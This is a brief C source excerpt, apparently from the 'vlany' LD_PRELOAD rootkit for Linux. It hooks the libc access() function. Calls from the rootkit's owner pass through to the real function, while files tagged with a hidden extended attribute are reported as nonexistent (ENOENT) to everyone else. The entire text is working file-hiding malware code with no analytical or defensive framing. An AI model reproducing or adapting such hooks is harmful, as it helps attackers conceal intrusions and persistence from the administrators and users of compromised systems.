// man i hate this function

int access(const char *path, int amode)
{
    #ifdef DEBUG
        printf("[vlany] access() called\n");
    #endif

    HOOK(old_access, CACCESS);

    if(owned()) return old_access(path, amode);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_access(path, amode);
}
